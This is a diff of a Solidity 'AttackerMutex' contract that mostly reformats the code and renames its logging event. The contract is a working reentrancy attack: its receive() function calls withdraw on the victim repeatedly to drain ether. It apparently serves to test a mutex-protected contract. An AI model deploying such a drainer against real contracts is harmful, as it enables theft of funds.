@@ -5,31 +5,32 @@ pragma solidity ^0.7.0;
 import './MutexPattern.sol';
 
 contract AttackerMutex {
-  MutexPattern v;
-  uint256 public count;
-  uint amount = 1 ether;
-  address payable public victimAddress;
+    MutexPattern v;
+    uint256 public count;
+    uint amount = 1 ether;
+    address payable public victimAddress;
 
-  event LogFallback(uint c, uint balance);
+    event ReceivedTokens(uint c, uint balance, address addr);
 
-  constructor (MutexPattern victim) {
-    victimAddress = address(victim);
-    v = MutexPattern(victimAddress);
-  }
+    constructor (MutexPattern victim) {
+        victimAddress = address(victim);
+        v = MutexPattern(victimAddress);
+    }
 
-  receive () external payable {
-    count++;
-    emit LogFallback(count, address(this).balance);
-    if (count < 10) {
-      v.withdraw(amount);
-    } 
-  }
+    receive() external payable {
+        count++;
+        emit ReceivedTokens(count, address(this).balance, address(this));
 
-   function setBalance() public payable {
-     victimAddress.call{value: msg.value}("");
-  }
+        if (count < 10) {
+          v.withdraw(amount);
+        }
+    }
 
-  function attack () public {
-    v.withdraw(amount);
-  }
+    function setBalance() public payable {
+         victimAddress.call{value: msg.value}("");
+    }
+
+    function attack() public {
+        v.withdraw(amount);
+    }
 }
